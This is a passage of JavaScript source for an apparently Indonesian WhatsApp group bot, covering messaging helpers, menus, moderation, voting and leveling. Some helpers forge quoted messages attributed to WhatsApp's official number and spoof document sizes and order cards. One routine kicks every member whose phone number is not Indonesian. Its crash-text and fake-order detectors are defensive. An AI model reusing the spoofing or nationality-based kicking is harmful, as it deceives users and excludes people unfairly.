xdev.sendMessage(from, teks, text, { quoted: dev, contextInfo: { forward, externalAdReply:{title: `${fake}`,body:`${week} ${calender}`,previewType:"PHOTO",thumbnail: fs.readFileSync('./stik/reply.jpg'), sourceUrl:`http://wa.me/${Ownerin.split("@")[0]}`}}})
} else if(setTroli){
var yakult = xdev.prepareMessageFromContent(from, {
'orderMessage': {
'orderId': '0@s.whatsapp.net',
'thumbnail': fs.readFileSync('./stik/reply.jpg'),
'itemCount': jumlahTroli,
'status': 1,
'surface': 1,
'message':teks,
'orderTitle': fake,
'sellerJid': `0@s.whatsapp.net`,
'token': 'notoken',
}
}, {
'quoted': dev,
'contextInfo': forward
});
xdev.relayWAMessage(yakult)  
} else if(setMessage){
xdev.sendMessage(from, teks, text, { quoted: dev });
} else if(setVideo){
xdev.sendMessage(from, teks, text, { quoted: dev, contextInfo: { externalAdReply: { title: `${fake}`, body: `${copyright}`, thumbnailUrl: '', thumbnail: thumb, mediaType:"2", previewType: "VIDEO", mediaUrl: "https://youtu.be/nLEYHaaB6x0"}}})
} 
}
            
//SENDKONTAK
const sendKontak = (from, nomor, nama, org = "") => {
const vcard ="BEGIN:VCARD\n" +"VERSION:3.0\n" + "FN:" +nama +"\n" +"ORG:" + org + "\n" +"TEL;type=CELL;type=VOICE;waid=" +nomor + ":+" +nomor +"\n" +"END:VCARD";
xdev.sendMessage(from, { displayname: nama, vcard: vcard }, MessageType.contact,{ quoted: dev });
};

//******************* 》BUTTON CMD《 ********************\\
   
///Button Text
const sendButMessage = (id, text1, desc1, but = []) => {
const buttonMessage = {
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 1,
}
xdev.sendMessage(id, buttonMessage, MessageType.buttonsMessage, {quoted: setQuoted})
}

///Button Image
const sendButImage = async(id, text1, desc1, gam1, but = [], options1 = {}) => {
kma = gam1
mhan = await xdev.prepareMessage(from, kma, image)
locmhan = mhan.message["ephemeralMessage"] ? mhan.message.ephemeralMessage : mhan
const buttonMessages = {
imageMessage: locmhan.message.imageMessage,
contentText:  text1,
footerText: desc1,
buttons: but,
headerType: 4
}
xdev.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options1)
}

///Button Video
const sendButVideo = async(id, text1, desc1, vid1, but = [], options = {}) => {
kma = vid1
mhan = await xdev.prepareMessage(from, kma, video)
locmhan = mhan.message["ephemeralMessage"] ? mhan.message.ephemeralMessage : mhan
 buttonMessages = {
videoMessage: locmhan.message.videoMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 5
}
xdev.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}







//Button Location
const sendButLocation = async (id, text1, desc1, gam1, but = [], options = {}) => {
kma = gam1
mhan = await xdev.prepareMessage(id, {jpegThumbnail: kma}, MessageType.location)
locmhan = mhan.message["ephemeralMessage"] ? mhan.message.ephemeralMessage : mhan
buttonMessages = {
locationMessage: locmhan.message.locationMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 'LOCATION',
}
xdev.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}
					
					
					
					
//Button document
const Sendbutdocument = async(id, text1, desc1, gam1, but = [], options = {}) => {	

if(docType === "pptx"){
var AppType = "application/vnd.openxmlformats-officedocument.presentationml.presentation"
} else if(docType === "xlsx"){
var AppType = "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet"
} else if(docType === "zip"){
var AppType = "application/zip"
} else if(docType === "pdf"){
var AppType = "application/pdf"
} else if(docType === "docx"){
var AppType = "application/vnd.openxmlformats-officedocument.wordprocessingml.document"
}

xdev.sendMessage(id, { 
contentText: text1, 
footerText: desc1,
buttons: but, 
"headerType": "DOCUMENT", 
"documentMessage": { 
"url": "https://mmg.whatsapp.net/d/f/Ano5cGYOFQnC51uJaqGBWiCrSJH1aDCi8-YPQMMb1N1y.enc", 
"mimetype": AppType, 
"title": "Footer text", 
"fileSha256": "8Xfe3NQDhjwVjR54tkkShLDGrIFKR9QT5EsthPyxDCI=", 
"fileLength": 999999999999, 
"pageCount": 100, 
"mediaKey": "XWv4hcnpGY51qEVSO9+e+q6LYqPR3DbtT4iqS9yKhkI=", 
"fileName": namaDocument, 
"fileEncSha256": "NI9ykWUcXKquea4BmH7GgzhMb3pAeqqwE+MTFbH/Wk8=", 
"directPath": "/v/t62.7119-24/35160407_568282564396101_3119299043264875885_n.enc?ccb=11-4&oh=d43befa9a76b69d757877c3d430a0752&oe=61915CEC", 
"mediaKeyTimestamp": "1634472176", 
"jpegThumbnail": gam1}}, 
MessageType.buttonsMessage, options)
}


///Button GIF
const sendButGif = async(id, text1, desc1, vid1, but = [], options = {}) => {
kma = vid1
mhan = await xdev.prepareMessage(from, kma, video)
locmhan = mhan.message["ephemeralMessage"] ? mhan.message.ephemeralMessage : mhan
 buttonMessages = {
"videoMessage": {
								"url": "https://mmg.whatsapp.net/d/f/AuakWjy9j5qN9CdqT-qXBSQQZhZnU6N5oRpeEtksux55.enc",
								"mimetype": "video/mp4",
								"fileSha256": "5/kAkLe0/v/qdr4+tuzfaLek5amLtmBMOEbT/QuQjzY=",
								"fileLength": "1034956",
								"mediaKey": "LPQDAPf6zW8PACamYz7xG5/G97NdSQQqPTxOdkNNFA4=",
								"caption": "gak ada caption",
                                "gifPlayback": true,
								"fileEncSha256": "/T0JjKqoRV8vzVdfg4A6gFnpyXKannOnGzizF2qzW7I=",
								"directPath": "/v/t62.7161-24/56110223_286179063412517_3375769014357639542_n.enc?ccb=11-4&oh=01_AVxW3V43BttCGCRfooz_Waa3rjpBtEOBnvkEnY73ngUPnw&oe=62157834",
								"mediaKeyTimestamp": "1643034068",
								"jpegThumbnail": "/9j//gAQTGF2YzU4LjU0LjEwMAD/2wBDAAgEBAQEBAUFBQUFBQYGBgYGBgYGBgYGBgYHBwcICAgHBwcGBgcHCAgICAkJCQgICAgJCQoKCgwMCwsODg4RERT/xABsAAEBAQEAAAAAAAAAAAAAAAAFBgQDAQEBAQAAAAAAAAAAAAAAAAAAAQMQAAICAQQBAgUFAQAAAAAAAAECAwQREgAhBTFBE1EigQYUYiNxMhZhEQACAwEBAQAAAAAAAAAAAAACEQAxASESA//AABEIACAAIAMBIgACEQADEQD/2gAMAwEAAhEDEQA/ACekeu89iKVY2E9Q41KG5jbOBn4h8/TY8yCGVkX5QrHjeiillqFG8hQBIQZCXAIATQ4x5zqA42T9xdia1C1Opw2kqh/W3C/UE5+m9uu9h7HegtiG6jZxzg759zIJbsjZ8tnO53oSnVx0bq255Y7/ALleRZgF9izHodASCR+4pk0n+BnO1p3/ACFIPrwdt5tw9mzrYrp6qxBWkiieG1ZiZpiFGgTFj/YHHyE443N2A3Ydp11O2qtEhnlKqhHvaMBM6OX0k+gzjbt2BZLnbmVnQPNrKo3AEkaOSMr5884250n2l0MN83VjnmdAYYmnlLsASCzLgKBnxwPQ7ong9TkIXxqRtq9LLYl6u9EsYYpNFiFgwMZPtyIc6A/o3HIb471RyNjdv2X271PYSt71SNy0WgNlgw0sGAEiMHXnBwD/AM2L/nujikdHoKWRirIZ7RAI8jP5HONiPPpeKQR8Yrn/2Q==",
								"gifAttribution": "GIPHY"
							},
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 5
}
xdev.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}


//Katalog menu
const sendKatalog = async (deskripsi ) => {   
hmm4 = fs.readFileSync('./stik/thumb.jpeg')
imeu =   await xdev.prepareMessage('0@s.whatsapp.net', hmm4, image, { thumbnail : fs.readFileSync(`./stik/fake.jpeg`)}), 
imeg = imeu.message.imageMessage
res =   xdev.prepareMessageFromContent(from, {
'productMessage': {
'product': {
'productImage': imeg,
'productId': 'IDR',
'title': fake,
'description': deskripsi,
'retailerId': copyright,
'itemCount': jumlahTroli,
'priceAmount1000': '1000',
'descriptionCount': 1,
'productImageCount': '1'
},
'businessOwnerJid': `${nomerOwner}@s.whatsapp.net`        
}
}, {
contextInfo: forward,
quoted: setQuoted
 }), 
 xdev.relayWAMessage(res)         
}

//Troli menu
const sendTroli = async (deskripsi ) => {
var sendnih = xdev.prepareMessageFromContent(from, {
'orderMessage': {
'orderId': '0@s.whatsapp.net',
'thumbnail': fs.readFileSync(`./stik/fake.jpeg`),
'itemCount': jumlahTroli,
'status': 1,
'surface': 1,
'message':deskripsi,
'orderTitle': fake,
'sellerJid': `0@s.whatsapp.net`,
'token': 'notoken',
}
}, {
'quoted': setQuoted,
'contextInfo': forward,
});
xdev.relayWAMessage(sendnih)    
}

//SendBc
const sendBc = async(id, text1, desc1, gam1, but = [], options = {}) => {	
if(bcDokumen) {
Sendbutdocument(id, text1,desc1,gam1, but, options)
 } else  if(bcLokasi) {  
sendButLocation(id, text1,desc1,fs.readFileSync('./stik/fake.jpeg'), but, options)
} else if(bcTroli) {
sendButMessage(id, text1, desc1, but)
} else {
xdev.sendMessage(id, `${text1}\n\n${desc1}`, text)
}
}

//onlyOwner
const onlyOwner = async() =>{
if(autovn){
sendvn(gakmau)
}else if(autosticker){
sendSticker(gaboleh)
} else if(typing){
setReply(mess.owner)
}else {
setReply(mess.owner)
}
}



//******************* 》FAKE MESSAGE《 ********************\\

      
const sendvn = (teks) => {
xdev.sendMessage(from, teks, audio, {mimetype: 'audio/mp4', thumbnail: fs.readFileSync('./stik/fake.jpeg'), quoted: dev, ptt: true})
}     
const reply = (teks) => {
xdev.sendMessage(from, teks, text, { quoted: dev });
};
const sendMess = (teks) => {
xdev.sendMessage(from, teks, text)
}
const mentions = (teks, memberr, id) => {
(id == null || id == undefined || id == false) ? xdev.sendMessage(from, teks.trim(), extendedText, { contextInfo: { "mentionedJid": memberr } }) : xdev.sendMessage(from, teks.trim(), extendedText, { quoted: dev, contextInfo: { "mentionedJid": memberr, forwardingScore: totalForward, isForwarded: forwarding } })
}
const costum = (pesan) => {
if (Loading){
xdev.sendMessage(from, pesan, text, {quoted: { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `*${fake}*`, 'jpegThumbnail': fs.readFileSync('./stik/fake.jpeg')}}}})
} 
}
const sendSticker = (pesan) => {
xdev.sendMessage(from, pesan, sticker, {quoted: dev, contextInfo: forward})
}
const sendSticker1 = (pesan) => {
xdev.sendMessage(from, pesan, sticker)
}
const math = (teks) => {
return Math.floor(teks)
}  
const sendVideo = (teks) => {
xdev.sendMessage(from, teks, video, { quoted: dev });
};       
const sendGif = (teks, teksnya) => {
xdev.sendMessage(from, teks, video, { caption: teksnya, mimetype: Mimetype.gif, quoted: dev });
};        
const sendAudio = (file) => {
xdev.sendMessage(from, file, audio, { mimetype: 'audio/mp4', quoted: dev });
};        
                    

 
 
//******************* 》FUNCTION《 ********************\\

const sendStickerFromUrl = async(to, url) => {
var names = Date.now() / 10000;
var download = function (uri, filename, callback) {
request.head(uri, function (err, res, body) {
request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
});
};
download(url, './stik' + names + '.png', async function () {
console.log('selesai');
let filess = './stik' + names + '.png'
let asw = './stik' + names + '.webp'
exec(`ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${asw}`, (err) => {
let media = fs.readFileSync(asw)
xdev.sendMessage(to, media, sticker,{quoted:dev})
fs.unlinkSync(filess)
fs.unlinkSync(asw)
});
});
}
            
           
const sendMediaURL = async(to, url, text="", mids=[]) =>{
if(mids.length > 0){
text = normalizeMention(to, text, mids)
}
const fn = Date.now() / 10000;
const filename = fn.toString()
let mime = ""
var download = function (uri, filename, callback) {
request.head(uri, function (err, res, body) {
mime = res.headers['content-type']
request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
});
};
download(url, filename, async function () {
console.log('done');
let media = fs.readFileSync(filename)
let type = mime.split("/")[0]+"Message"
if(mime === "image/gif"){
type = MessageType.video
mime = Mimetype.gif
}
if(mime === "application/pdf"){
type = MessageType.document
mime = Mimetype.pdf
}
if(mime.split("/")[0] === "audio"){
mime = Mimetype.mp4Audio
}
xdev.sendMessage(to, media, type, { quoted: dev, mimetype: mime, caption: text,contextInfo: {"mentionedJid": mids}})
fs.unlinkSync(filename)
});
}
            
const sendFileFromUrl = async(link, type, options) => {         
hasil = await getBuffer(link)
await xdev.sendMessage(from, hasil, type, options).catch(e => {
fetch(link).then((hasil) => {
xdev.sendMessage(from, hasil, type, options).catch(e => {
xdev.sendMessage(from, { url : link }, type, options).catch(e => {
setReply("_[ ! ] Error Gagal Dalam Mendownload Dan Mengirim Media_")
console.log(e)
})
})
})
})
}

const sendWebp = async(to, url) => {
var names = Date.now() / 10000;
var download = function (uri, filename, callback) {
request.head(uri, function (err, res, body) {
request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
});
};
}


   
const sendStickerUrl = async(to, url) => {
console.log(color(time, 'magenta'), color(moment.tz('Asia/Jakarta').format('HH:mm:ss'), "gold"), color('Downloading sticker...'))
var names = getRandom('.webp')
var namea = getRandom('.png')
var download = function (uri, filename, callback) {
request.head(uri, function (err, res, body) {
request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
});
};
download(url, namea, async function () {
let filess = namea
let asw = names
require('./lib/exif.js')
exec(`ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${asw}`, (err) => {
exec(`webpmux -set exif ./sticker/data.exif ${asw} -o ${asw}`, async (error) => {
let media = fs.readFileSync(asw)
xdev.sendMessage(to, media, sticker, dev)
console.log(color(time, 'magenta'), color(moment.tz('Asia/Jakarta').format('HH:mm:ss'), "gold"), color('Succes send sticker...'))
fs.unlinkSync(names)
fs.unlinkSync(namea)
});
});
});
}
         
//CMD BUTTON FUNCTION
selectedButton = (type == 'buttonsResponseMessage') ? dev.message.buttonsResponseMessage.selectedButtonId : ''
responseButton = (type == 'listResponseMessage') ? dev.message.listResponseMessage.title : ''
                          
            
//******************* 》SECURITY《 ********************\\
            
//ANTI VIO 
if (!dev.key.fromMe && isGroup && isAntiviewonce && m.mtype == "viewOnceMessage") {       	
setReply(`@${sender.split("@")[0]} Terdeteksi mengirim gambar/video viewonce!`);
var msg = { ...dev };
msg.dev = dev.message.viewOnceMessage.message;
msg.dev[Object.keys(msg.dev)[0]].viewOnce = false;
xdev.copyNForward(m.chat, msg);
}
 
//ANTI HIDETAG
if (isGroup && isAntihidetag && m.message[m.mtype]?.contextInfo?.mentionedJid?.length == groupMembers.length) {    
if (isGroupAdmins) return setReply('Admin bebas pakai hidetag dong :v')
console.log( color("[ANTI-HIDETAG]", "red"), color(`@${sender.split("@")[0]} mengirim pesan hidetag`, "cyan") );
setReply(`Maaf, Botz akan mengeluarkan kamu karena kamu terdetaksi mengirim pesan hidetag`);
setTimeout(() => {
xdev.groupRemove(from, [sender]);
},3000)
}
       
//ANTI TROLI 
if (m.message  && !m.key.fromMe && m.isBaileys && m.quoted && m.quoted.mtype === 'orderMessage' && !(m.quoted.token && m.quoted.orderId)) {
if (antibugtroli === false) return
if(jeda === true) return
jeda = true
m.reply('Troli Detected\n\n' + require('util').format(m.key))
await xdev.modifyChat(m.chat, 'delete', {
includeStarred: false
})
setTimeout( () => {
jeda = false
},2000)
}

//ANTI BADWORD 
if (isGroup && Toxic && !isOwner && !isGroupAdmins && !dev.key.fromMe){ 
if (badword.includes(messagesC)) {
if (isCountKasar(sender, senbadword)){
if (!isBotGroupAdmins) return setReply(`Kamu beruntung karena bot bukan admin`)
setReply(`*「 ANTI BADWORD 」*\n\nSepertinya kamu sudah berkata kasar lebih dari 5x, maaf kamu akan di kick`)
setTimeout( () => {
xdev.groupRemove(from, [sender])
},1000)
delCountKasar(sender, senbadword)
} else {
addCountKasar(sender, senbadword)
setReply(`Kamu terdeteksi berkata kasar\nJangan ulangi lagi atau kamu akan dikick oleh botz`)
}
}
}
           
//ANTI VIRUS
if (isGroup && AntiVirtex && budy.length > 20000) {
if (isGroupAdmins) return setReply('*VIRTEX DETECTED*')
console.log(color('[KICK]', 'red'), color('Received a virus text!', 'yellow'))
await xdev.modifyChat(from, ChatModification.delete)                 
await xdev.sendMessage(from, antivirus(pushname,groupName), text)
if (!isBotGroupAdmins) return 
if(isOwner) return 
await xdev.groupRemove(from, [sender])
await xdev.groupSettingChange(from, GroupSettingChange.messageSend, true)
await sendMess("Group Telah Di Tutup")
await xdev.sendMessage(`${nomerOwner}@s.whatsapp.net`, `Hai Owner! wa.me/${sender.split("@")[0]} Terdeteksi Telah Mengirim Virtex ${isGroup?`di Group ${groupName}`:''}`, text)
 }
 
 
//Auto clear jika terdapat pesan yg tidak dapat dilihat oleh whatsapp web
if (m.messageStubType === 68) {
console.log("Auto clear chat, virtex terdeteksi")
await xdev.modifyChat(m.chat, 'clear', {
includeStarred: false
})
}

    
 //ANTI LINK GROUP
if (isGroup && isAntilinkGc && budy.includes(`chat.whatsapp.com`)) {
if (isGroupAdmins) return setReply('Alah sia admin grup mah bebas yekan :v')
linkgc = await xdev.groupInviteCode(from)
if (budy.includes(`${linkgc}`)) return reply ('Wuanjir kirain link grup lain, huh hampir aja kena kick 😆')
if (budy.includes('zin admin') || budy.includes('zinmin') )return setReply('Izin Admin diterima')
var kic = `${sender.split("@")[0]}@s.whatsapp.net`
setReply(` *「 LINK GROUP DETECTED 」*\nKamu mengirimkan link group, maaf kamu di kick dari grup :(`)
setTimeout(() => {
xdev.groupRemove(from, [kic]).catch((e) => { setReply(`BOT HARUS JADI ADMIN`) })
}, 2000)
}   

 //ANTI LINK 
if (isGroup && isAntiLink){
if (budy.includes(`https:`)) { 
if (isGroupAdmins) return setReply('Alah sia admin grup mah bebas yekan :v')
linkgc = await xdev.groupInviteCode(from)
if (budy.includes(`${linkgc}`)) return reply ('Wuanjir kirain link grup lain, huh hampir aja kena kick 😆')
if (budy.includes('zin admin') || budy.includes('zinmin') )return setReply('Izin Admin diterima')
var kic = `${sender.split("@")[0]}@s.whatsapp.net`
setReply(` *「 LINK DETECTED 」*\nKamu mengirimkan link, maaf kamu di kick dari grup :(`)
setTimeout(() => {
xdev.groupRemove(from, [kic]).catch((e) => { setReply(`BOT HARUS JADI ADMIN`) })
}, 2000)
}
}

 //ANTI ASING/BULE ok
if (isGroup && isKickarea && !dev.key.fromMe) {    
member = await groupMembers.map(u => u.jid)
for ( let i = 0; i <member.length; i++){  
if (member[i].slice(0,2) !== "62" ){     	
let users = await groupMembers.find(u => u.jid == member[i]) 
if (!users.groupAdmins ){
await xdev.groupRemove(from, [member[i]])     
}
}
}
}  




    

//******************* 》FUNCTION OTHERS《 ********************\\

// MUTE
if (checkDataId ("mute", from, DataId)  ){
if (!isOwner && !theOwner) return
}
    
//AFK FUNCTION
cekafk(afk)
if (!dev.key.remoteJid.endsWith('@g.us') && offline){
if (!dev.key.fromMe && !isOwner){
if (isAfk(dev.key.remoteJid)) return
addafk(dev.key.remoteJid)
heheh = ms(Date.now() - waktu) 
xdev.sendMessage(dev.key.remoteJid,`@${nomerOwner} Sedang Offline!\n\n*Alasan :* ${alasan}\n*Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik lalu\n\nSilahkan Hubungi Lagi Nanti`, MessageType.text,{contextInfo:{ mentionedJid: [`${nomerOwner}@s.whatsapp.net`],'stanzaId': "B826873620DD5947E683E3ABE663F263", 'participant': "0@s.whatsapp.net", 'remoteJid': 'status@broadcast', 'quotedMessage': {"imageMessage": {"caption": "*OFFLINE*", 'jpegThumbnail': fs.readFileSync('./stik/thumb.jpeg')}}}})
}
}   
if (dev.key.remoteJid.endsWith('@g.us') && offline) {
if (!dev.key.fromMe && !isOwner){
if (dev.message.extendedTextMessage != undefined){
if (dev.message.extendedTextMessage.contextInfo != undefined){
if (dev.message.extendedTextMessage.contextInfo.mentionedJid != undefined){
for (let ment of dev.message.extendedTextMessage.contextInfo.mentionedJid) {
if (ment === `${nomerOwner}@s.whatsapp.net`){
if (isAfk(dev.key.remoteJid)) return
addafk(dev.key.remoteJid)
heheh = ms(Date.now() - waktu)
xdev.sendMessage(dev.key.remoteJid,`@${nomerOwner} Sedang Offline!\n\n *Alasan :* ${alasan}\n *Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik lalu\n\nSilahkan Hubungi Lagi Nanti`, MessageType.text,{contextInfo:{ mentionedJid: [`${nomerOwner}@s.whatsapp.net`],'stanzaId': "B826873620DD5947E683E3ABE663F263", 'participant': "0@s.whatsapp.net", 'remoteJid': 'status@broadcast', 'quotedMessage': {"imageMessage": {"caption": "*OFFLINE*", 'jpegThumbnail': fs.readFileSync('./stik/thumb.jpeg')}}}})
}
}
}
}
}
}
}
  
   
//BOT FUNCTION
const oawalah =['iya kak ?','Ada apa kak ?','Bot aktif kak','Aku bukan bot kak, aku ini hooman','Kumaha atuh kak ?','Kunaon kak ?','oy ?','ya ?','Kenapa panggil aku','Ada apa kak kok panggil aku','Naon siah kehed manggil manggil']
const hayuk = oawalah[Math.floor(Math.random() * oawalah.length)]
  
//VOTING FUNCTION
if(isGroup && !isVote) {
if (budy.toLowerCase() === 'vote'){
let vote = JSON.parse(fs.readFileSync(`./lib/${from}.json`))
let _votes = JSON.parse(fs.readFileSync(`./lib/vote/${from}.json`))  
let fil = vote.map(v => v.participant)
let id_vote = sender ? sender : '6285751056816@s.whatsapp.net'
if(fil.includes(id_vote)) {
return mentions('@'+sender.split('@')[0]+' Anda sudah vote', fil, true)
} else {
vote.push({
participant: id_vote,
voting: '✅'
})
fs.writeFileSync(`./lib/${from}.json`,JSON.stringify(vote))
let _p = []
let _vote = '*Vote* '+ '@'+ _votes[0].votes.split('@')[0] + `\n\n*Alasan*: ${_votes[0].reason}\n*Jumlah Vote* : ${vote.length} Vote\n*Durasi* : ${_votes[0].durasi} Menit\n\n` 
for(let i = 0; i < vote.length; i++) {
_vote +=  `@${vote[i].participant.split('@')[0]}\n*Vote* : ${vote[i].voting}\n\n`
_p.push(vote[i].participant)
 }  
_p.push(_votes[0].votes)
mentions(_vote,_p,true)   
}
} else if (budy.toLowerCase() === 'devote'){
const vote = JSON.parse(fs.readFileSync(`./lib/${from}.json`))
let _votes = JSON.parse(fs.readFileSync(`./lib/vote/${from}.json`))  
let fil = vote.map(v => v.participant)
let id_vote = sender ? sender : '6285751056816@s.whatsapp.net'
if(fil.includes(id_vote)) {
return mentions('@'+sender.split('@')[0]+' Anda sudah vote', fil, true)
} else {
vote.push({
participant: id_vote,
voting: '❌'
})
fs.writeFileSync(`./lib/${from}.json`,JSON.stringify(vote))
let _p = []
let _vote = '*Vote* '+ '@'+ _votes[0].votes.split('@')[0] + `\n\n*Alasan*: ${_votes[0].reason}\n*Jumlah Vote* : ${vote.length} Vote\n*Durasi* : ${_votes[0].durasi} Menit\n\n` 
for(let i = 0; i < vote.length; i++) {
_vote +=  `@${vote[i].participant.split('@')[0]}\n*Vote* : ${vote[i].voting}\n\n`
_p.push(vote[i].participant)
}  
_p.push(_votes[0].votes)
mentions(_vote,_p,true)   
}
}
}	
 
//PUBLIC
if (publik === false) {
if (!dev.key.fromMe && !isOwner && !theOwner) return
}

//BAN CHAT
if (isBanchat){
if (!isOwner && !theOwner && !isGroupAdmins) return
}

if(isBanned && !isOwner) return
if(cekSpam("Case",senderNumber, AntiSpam)) return
SpamExpired(senderNumber, "NotCase", AntiSpam)
SpamExpired(senderNumber, "Case", AntiSpam)
expiredClaim(_claim)
       
//ANTI SPAM
if (isCmd && msgFilter.isFiltered(from) && !isGroup && !dev.key.fromMe && !isOwner) {
console.log(color('[SPAM]', 'red'), color(moment.tz('Asia/Jakarta').format('HH:mm'), "green"), color(`${command} [${args.length}]`), 'dari', color(pushname))
addSpam("Case",senderNumber, "30s", AntiSpam)
console.log(color('[SPAM]', 'red'), color(moment.tz('Asia/Jakarta').format('HH:mm'), "green"), color(`Berhasil banned ${pushname} sementara`))
if(autovn && !nopref) {
return sendvn(nospam)
} else if(!autovn && !nopref){
return setReply(textspam)
}
}
        
if (isCmd && msgFilter.isFiltered(from) && isGroup && !dev.key.fromMe && !isOwner) {
console.log(color('[SPAM]', 'red'), color(moment.tz('Asia/Jakarta').format('HH:mm'), "green"), color(`${command} [${args.length}]`), 'from', color(pushname), 'in', color(groupName))
addSpam("Case",senderNumber, "30s", AntiSpam)
console.log(color('[SPAM]', 'red'), color(moment.tz('Asia/Jakarta').format('HH:mm'), "green"), color(`Berhasil banned user sementara`), 'from', color(pushname))
if(autovn && !nopref) {
return sendvn(nospam)
} else if(!autovn && !nopref){
return setReply(textspam)
}
}
if (isCmd && !isOwner) msgFilter.addFilter(from)

   
//******************* 》AUTO SYSTEM《 ********************\\

//AUTO BIO
if(autobio){ 
runoy = process.uptime() 
xdev.setStatus(`${fake} | ⏰ ${kyun(runoy)} | 🔋 ${baterai.battery}`).catch((_)=>_);
}
     
//AUTO REGISTER && !dev.key.fromMe && !isOwner
if (!isHit && isCmd ){ 
addUserId(gcount, limitCount, calender, pushname, senderNumber, user)
}
   
//Auto Hit 
if(command){
AddHit(senderNumber, user)
cmdAdd("run", "1d", hitnya)
}
expiredCmd(hitnya)
const thisHit = `${getHit("run", hitnya)}`











//--------------------------BATAS EXP USER------------------------\\


//Exp User
if ( isHit && !itsMe && !isCmd ||  isHit && !itsMe && command ) {

//Auto clear chat
if(!checkAutoClear("AutoClearChat", hitnya)){
console.log(`add autoclear chat`)
addAutoClear("AutoClearChat", "1d", hitnya) 
}

        


try {
if (userLevel === undefined && userId === undefined) {
addUserId(gcount, limitCount, calender, pushname, senderNumber, user)
}

if (autoLevel){
addLevelingXp(senderNumber, amountExp, user)
}
if (autoLevel && userExp >= requiredExp || autoLevel && userExp == requiredExp) {
addLevelingLevel(senderNumber, 1, user)
resetLevelingXp(senderNumber, userExp, user)


anune =`${userLevel}00`
susu = randomNomor(math(anune))
addBalance(senderNumber, susu, user)


//Hadiah Limit
if(userLevel >= 25){
anuitu =`${userLevel}`
 sapi = randomNomor(math(anuitu))
giveLimit(senderNumber, sapi, user)
} else {
sapi = "0"
}


//Hadiah Premium
if(userLevel >= 50){
nana = randomNomor(24) + "h"
_prem.addPremiumUser (sender, nana, premium)         
} else {
	nana = "0"
}

levelnih = userLevel + 1

teks = `*]───「 LEVEL UP 」───[*

Selamat, kamu telah naik ke level ${levelnih}
Pangkatmu saat ini adalah 「 *${userLeveling(levelnih)}* 」
Dan kamu telah mendapatkan
💳 Saldo  : Rp ${susu}
📉 Limit : ${sapi}
🎫 Premium : ${nana.split("h")[0]} Jam`
but = [{ buttonId: `${prefix}myprofile`, buttonText: { displayText: `ᴘʀᴏғɪʟᴇ` }, type: 1 },{ buttonId: `${prefix}shop`, buttonText: { displayText: `sʜᴏᴘ` }, type: 1 } ];         
await setReply(teks)
}
} catch (err) {
console.error(err)
}
}


autoClearChat( totalchat, xdev, ChatModification, hitnya)



//-----------------------------------------BATAS->








//AUTO TYPING & RECORDING
if (isCmd && autovn){
xdev.updatePresence(from, Presence.recording)
} else if (isCmd && typing){
xdev.updatePresence(from, Presence.composing)
} else {
xdev.updatePresence(from, Presence.avaible)
}

//AUTO BLOCK CMD
for (let i = 0; i < listcmdblock.length ; i++) {
if (command === listcmdblock[i].cmd ){
if(autoblockcmd) {
setReply("Maaf kak command tersebut telah di block oleh system karena terjadi error")
return
} else{
setReply(`Maaf kak command tersebut telah di block oleh owner`)
return
}
}
}

//AUTO RESPON
for (let i = 0; i < commandsDB.length ; i++) {
if (budy == commandsDB[i].pesan) {
xdev.sendMessage(from, commandsDB[i].balasan, text, {quoted: dev})
}
}
    
//AUTO RESPON SIMI BY DECODE DENPA 
if (chatBot === false && autorespon === true && !isGroup && !isCmd && !command && !dev.key.fromMe) { 
simi = await fetchJson(`https://api.simsimi.net/v2/?text=${cmd}&lc=id`)
sami = simi.success
xdev.sendMessage(from, `${sami}`, text, {thumbnail : fakethumbnail, quoted: { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${fake}`,"title": `Hmm`,'jpegThumbnail': thumb}}}})
} 
    
//AUTO RESPON STICKER
if (setiker.includes(messagesC)){
if(isExtream) return
namastc = messagesC
buffer = fs.readFileSync(`./temp/stick/${namastc}.webp`)
xdev.sendMessage(from, buffer, sticker, {quoted:dev })
}
	
//AUTO RESPON VN
for (let anju of audionye){
if (budy === anju){
if (cekSpam("NotCase",senderNumber, AntiSpam)) return sendSticker(spam2)
buffer = fs.readFileSync(`./temp/audio/${anju}.mp3`)
xdev.sendMessage(from, buffer, audio, {mimetype: 'audio/mp4', quoted: {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${pushname} \n「 audio 」 ${anju}`,"title": `Hmm`,'jpegThumbnail': fs.readFileSync('./stik/thumb.jpeg')}}}, ptt: true, contextInfo: forward})
addSpam("NotCase",senderNumber, "10s", AntiSpam)
}
}
	
//AUTO RESPON MUSIK
for (let anjir of musiknye){
if (budy === anjir || responseButton === anjir ){
setReply("*Loading...*")
buffer = fs.readFileSync(`./temp/musik/${anjir}.mp3`)
